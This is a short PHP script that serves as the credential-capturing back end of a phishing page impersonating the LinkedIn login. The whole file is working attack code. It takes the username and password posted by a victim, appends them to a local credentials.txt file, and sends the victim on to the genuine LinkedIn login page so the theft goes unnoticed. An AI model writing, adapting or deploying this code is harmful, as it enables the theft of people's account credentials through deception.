<?php

file_put_contents("credentials.txt", "[+] Linkedin -> Usuario: " . $_POST['session_key'] . " Contraseña: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://www.linkedin.com/login');
exit();
?>
